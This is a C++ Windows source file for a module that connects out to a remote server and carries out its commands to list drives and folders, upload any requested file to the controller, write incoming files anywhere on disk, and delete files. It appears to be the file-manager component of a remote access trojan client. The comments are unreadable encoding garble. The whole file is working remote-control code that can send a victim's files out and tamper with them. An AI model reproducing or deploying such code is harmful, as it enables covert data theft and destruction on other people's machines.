#include "pch.h"
#include "File.h"

static File gFile;

File::File() {

	CmdGetDirFiles = "GET_DIRS_FILES";
	CmdDownloadFile = "DOWNLOAD_FILE";
	CmdUploadFile = "UPLOAD_FILE";
	CmdDeleteFile = "DELETE_FILE";

	CmdSendDrives = "SEND_DRIVES";
	CmdSendDirs = "SEND_DIRS";
	CmdSendFiles = "SEND_FILES";
	CmdDeleteFileSuccess = "DELETE_SUCCESS";
	CmdDeleteFileFailed = "DELETE_FAILED";

	CmdSplit = ";";
	CmdEnd = "\r\n";
	CmdFileSplit = "|";
}

void File::startByNewThread(std::string domain, int port)
{
	// �������Ͷ˿ںϲ�Ϊһ��char*
	// ����new�����Ŀռ���fileThreadProc��delete
	char* args = new char[MAX_PATH + sizeof(int)];
	domain.reserve(MAX_PATH);
	memcpy(args, domain.data(), MAX_PATH);
	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

	// ����ճ�¯��char*����
	HANDLE h = CreateThread(NULL, 0, File::fileThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD File::fileThreadProc(LPVOID args)
{
	// ��ȡ����������Ͷ˿���Ϣ
	char domain[MAX_PATH];
	memcpy(domain, args, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH));

	startFile(domain, port);
	// ������delete
	delete [] (char*)args;
	return true;
}

void File::startFile(std::string domain, int port)
{
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for file\r\n");
	}

	OutputDebugStringA("Started file\r\n");

	const int packetSize = 800;
	char szData[packetSize];
	int ret;
	std::string buf;

	while (true) {
		// �����ݻ��������� ��ֹռ��cpu
		ret = sock.recvData(szData, packetSize);

		if (ret == SOCKET_ERROR || ret == 0) {
			break;
		}
		// ���յ������ݼ��뵽buffer
		addDataToBuffer(&sock, buf, szData, ret);
	}

	OutputDebugStringA("Finished file\r\n");
}

void File::addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size)
{
	buf.append(data, size);

	// �ָ�ÿ������Ͳ�����ִ��
	int endIndex;
	while ((endIndex = buf.find(gFile.CmdEnd)) >= 0) {
		std::string line = buf.substr(0, endIndex);
		buf.erase(0, endIndex + gFile.CmdEnd.length());

		int firstSplit = line.find(gFile.CmdSplit);
		std::string cmd = line.substr(0, firstSplit);
		line.erase(0, firstSplit + gFile.CmdSplit.length());
		// ִ�б�����
		processCmd(sock, cmd, line);
	}
}

// ���������� ����ӳ�� ��ʳ�����߳���Ľ�����һ���ĵ���
std::map<std::string, std::string> File::parseArgs(std::string& data)
{
	std::vector<std::string> v;
	std::string::size_type pos1, pos2;
	pos2 = data.find(gFile.CmdSplit);
	pos1 = 0;
	while (std::string::npos != pos2) {
		v.push_back(data.substr(pos1, pos2 - pos1));
		pos1 = pos2 + gFile.CmdSplit.size();
		pos2 = data.find(gFile.CmdSplit, pos1);
	}
	if (pos1 != data.length()) v.push_back(data.substr(pos1));

	std::map<std::string, std::string> args;
	for (int i = 0; i < (int)v.size() - 1; i += 2) {
		args[v.at(i)] = v.at(i + 1);
	}

	return args;
}

void File::processCmd(TcpSocket* sock, std::string& cmd, std::string& data)
{
	std::map<std::string, std::string> args = parseArgs(data);

	if (cmd == gFile.CmdGetDirFiles) {
		doGetDirFiles(sock, args);
		return;
	}

	if (cmd == gFile.CmdDownloadFile) {
		doDownloadFile(sock, args);
		return;
	}

	if (cmd == gFile.CmdUploadFile) {
		doUploadFile(sock, args);
		return;
	}

	if (cmd == gFile.CmdDeleteFile) {
		doDeleteFile(sock, args);
		return;
	}
}

void File::doGetDirFiles(TcpSocket* sock, std::map<std::string, std::string>& args)
{
	std::string dir = args["DIR"];
	std::string data; // ��������

	// ���Ϊ�� ��ʾ��ȡ�̷�
	if (dir.size() == 0) {
		std::vector<std::string> drives;
		drives = getDrives();

		// ���̷���Ϣ���Ϊ���ݲ�����
		data.append(gFile.CmdSendDrives + gFile.CmdSplit);
		data.append("DRIVES" + gFile.CmdSplit);
		// ����̷���Ϣ
		int max = drives.size();
		for (int i = 0; i < max; ++i) {
			data.append(drives[i] + gFile.CmdFileSplit);
		}
		// ȥ������ָ���
		if (drives.size() > 0) {
			data.erase(data.size() - 1);
		}
		data.append(gFile.CmdEnd);
		// ����
		sock->sendData(data.data(), data.size());
	}
	else {
		// DIR������Ϊ�յ���� ָ����Ҫ��ȡ·����Ŀ¼
		std::vector<std::string> files;
		std::vector<std::string> dirs;
		// ��ȡ��·���µ�Ŀ¼���ļ�
		dirs = getDirs(dir);
		files = getFiles(dir);
		// ���췵������
		// ����·����·��
		data.append(gFile.CmdSendDirs + gFile.CmdSplit);
		data.append("DIR" + gFile.CmdSplit + dir + gFile.CmdSplit);
		data.append("DIRS" + gFile.CmdSplit);

		int max = dirs.size();
		for (int i = 0; i < max; ++i) {
			data.append(dirs[i] + gFile.CmdFileSplit);
		}
		// ȥ������ķָ���
		if (dirs.size() > 0) {
			data.erase(data.size() - 1);
		}
		data.append(gFile.CmdEnd);
		// ����·�����ļ�
		data.append(gFile.CmdSendFiles + gFile.CmdSplit);
		data.append("DIR" + gFile.CmdSplit + dir + gFile.CmdSplit);
		data.append("FILES" + gFile.CmdSplit);

		max = files.size();
		for (int i = 0; i < max; ++i) {
			data.append(files[i] + gFile.CmdFileSplit);
		}
		// ȥ������ķָ���
		if (files.size()) {
			data.erase(data.size() - 1);
		}
		data.append(gFile.CmdEnd);
		// ��������
		sock->sendData(data.data(), data.size());
	}

}

void File::doDownloadFile(TcpSocket* sock, std::map<std::string, std::string>& args)
{
	std::string filePath = args["FILE_PATH"];
	int port = atoi(args["PORT"].data());

	startSendFileByNewThread(filePath, sock->mIp, port);
}

void File::doUploadFile(TcpSocket* sock, std::map<std::string, std::string>& args)
{
	std::string filePath = args["FILE_PATH"];
	int port = atoi(args["PORT"].data());

	startRecvFileByNewThread(filePath, sock->mIp, port);
}

void File::doDeleteFile(TcpSocket* sock, std::map<std::string, std::string>& args)
{
	bool  ret = DeleteFileA(args["FILE_PATH"].data());
	std::string data;
	if (ret) {
		data.append(gFile.CmdDeleteFileSuccess);
		data.append(gFile.CmdEnd);
		sock->sendData(data.data(), data.size());
	}
	else {
		data.append(gFile.CmdDeleteFileFailed);
		data.append(gFile.CmdEnd);
		sock->sendData(data.data(), data.size());
	}
}

std::vector<std::string> File::getDrives()
{
	std::vector<std::string> drives;

	for (int i = 'b'; i <= 'z'; i++) {
		char d[MAX_PATH];
		sprintf_s(d, sizeof(d),"%c:\\*", i);

		WIN32_FIND_DATAA findData;
		HANDLE h = FindFirstFileA(d, &findData);
		if (h != INVALID_HANDLE_VALUE) {
			d[strlen(d) - 1] = '\0'; // ȥ��*�� ����Ϊ���β�ַ���
			drives.push_back(d);

			FindClose(h);
		}
	}

	return drives;
}

std::vector<std::string> File::getDirs(std::string dir)
{
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(dir.append("\\*").data(), &findData);
	std::vector<std::string> files;
	// ��·�������κ�·��
	if (hFind == INVALID_HANDLE_VALUE) {
		return files;
	}

	while (FindNextFileA(hFind, &findData)) {
		// ��Ҫ����.��.. ��ֹ��ѭ��
		if (!strcmp(findData.cFileName, "..") || !strcmp(findData.cFileName, ".")) {
			continue;
		}
		// �����Ŀ¼���ռ�����
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			files.push_back(findData.cFileName);
		}
	}

	FindClose(hFind);

	return files;
}

std::vector<std::string> File::getFiles(std::string dir)
{
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(dir.append("\\*").data(), &findData);
	std::vector<std::string> files;

	if (hFind == INVALID_HANDLE_VALUE) {
		return files;
	}

	while (FindNextFileA(hFind, &findData)) {
		// ��Ҫ����.��.. ��ֹ��ѭ��
		if (!strcmp(findData.cFileName, "..") || !strcmp(findData.cFileName, ".")) {
			continue;
		}
		// �������ռ�����Ŀ¼���ļ�
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			files.push_back(findData.cFileName);
		}
	}

	FindClose(hFind);

	return files;
}

void File::startSendFileByNewThread(std::string filePath, std::string domain, int port)
{
	// ���췢�͸�sendFileThreadProc�̺߳����Ĳ���
	char* args = new char[MAX_PATH + MAX_PATH + sizeof(int)];

	// ����ΪfilePath��domainԤ���ռ��ԭ����
	// ȷ������ô��ռ�����ݿ��Ը��� ��������
	filePath.reserve(MAX_PATH);
	memcpy(args, filePath.data(), MAX_PATH);

	domain.reserve(MAX_PATH);
	memcpy(args + MAX_PATH, domain.data(), MAX_PATH);

	memcpy(args + MAX_PATH + MAX_PATH, (char*)&port, sizeof(int));

	HANDLE h = CreateThread(NULL, 0, File::sendFileThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD File::sendFileThreadProc(LPVOID args)
{
	// ��ȡ�������Ĳ���
	char filePath[MAX_PATH], domain[MAX_PATH];
	memcpy(filePath, (char*)args, MAX_PATH);
	memcpy(domain, (char*)args + MAX_PATH, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH + MAX_PATH));
	// ����һ������ѽ һ��sendFile��Ҫ�ü�����������
	startSendFile(filePath, domain, port);
	// �ͷ�Ϊ���ζ�����Ŀռ�
	delete [] (char*)args;
	return true;
}

// ������sendFile����
void File::startSendFile(std::string filePath, std::string domain, int port)
{
	// ��������һ������
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for send file\r\n");
		return;
	}

	// ��������ʽ�򿪣���������c�����ļ�����
	FILE* fp;
	errno_t err = fopen_s(&fp,filePath.data(), "rb");
	if (err != 0) {
		sock.dissconnect();

		OutputDebugStringA("Failed to open file for send file\r\n");
		return;
	}

	// �ı��ļ�����дλ�õ�β��
	fseek(fp, 0, SEEK_END);
	unsigned int len = ftell(fp); // ��ȡ��ʱβ����ƫ��
	rewind(fp); // ���ڽ��ļ�ָ������ָ���ļ��Ŀ�ͷ��ͬʱ������ļ�����صĴ����eof���

	// ��ȡ�ļ����ͺ�׺
	char name[_MAX_FNAME], ext[_MAX_EXT];
	_splitpath_s(filePath.data(), NULL, 0, NULL, 0, name, sizeof(name), ext, sizeof(ext));

	// �����Զ������ݰ�ͷ �ȷ��Ͱ�ͷ �����ļ���С(�ֽ�)
	FileHeader header;
	sprintf_s(header.fileName, sizeof(header.fileName), "%s%s", name, ext);
	header.len = len;
	sock.sendData((char*)&header, sizeof(header));

	// �ֶη���
	const unsigned int packetLen = 800;
	char data[800];
	unsigned int pos = 0;

	while (pos < len) {
		int sendSize = (pos + packetLen) > len ? len - pos : packetLen;

		fread(data, 1, sendSize, fp);

		if (!sock.sendData(data, sendSize)) {
			return;
		}

		pos += sendSize;
	}

	fclose(fp);
}

void File::startRecvFileByNewThread(std::string filePath, std::string domain, int port)
{
	// ������̺߳����Ĳ���
	char* args = new char[MAX_PATH + MAX_PATH + sizeof(int)];

	filePath.reserve(MAX_PATH);
	memcpy(args, filePath.data(), MAX_PATH);

	domain.reserve(MAX_PATH);
	memcpy(args + MAX_PATH, domain.data(), MAX_PATH);

	memcpy(args + MAX_PATH + MAX_PATH, (char*)&port, sizeof(int));

	HANDLE h = CreateThread(NULL, 0, File::recvFileThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD File::recvFileThreadProc(LPVOID args)
{
	// �������߳�����hunterִ�в���
	char filePath[MAX_PATH], domain[MAX_PATH];
	memcpy(filePath, args, MAX_PATH);
	memcpy(domain, (char*)args + MAX_PATH, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH + MAX_PATH));

	startRecvFile(filePath, domain, port);

	delete [] (char*)args;
	return true;
}

void File::startRecvFile(std::string filePath, std::string domain, int port)
{
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for send file\r\n");
		return;
	}

	// ����һ���ļ�
	FILE* fp;
	errno_t err = fopen_s(&fp, filePath.data(), "wb");
	if (err != 0) {
		sock.dissconnect();

		OutputDebugStringA("Failed to open file for send file\r\n");
		return;
	}

	// �ֶν���
	const int packetLen = 800;
	char data[packetLen];
	while (true) {
		// hunter������͹ر��׽��� �������ﲻ����û�����ݶ���
		int ret = sock.recvData(data, packetLen);

		if (ret == SOCKET_ERROR || ret == 0) {
			break;
		}

		fwrite(data, 1, ret, fp);
	}

	if (fp) {
		fclose(fp);
	}
}
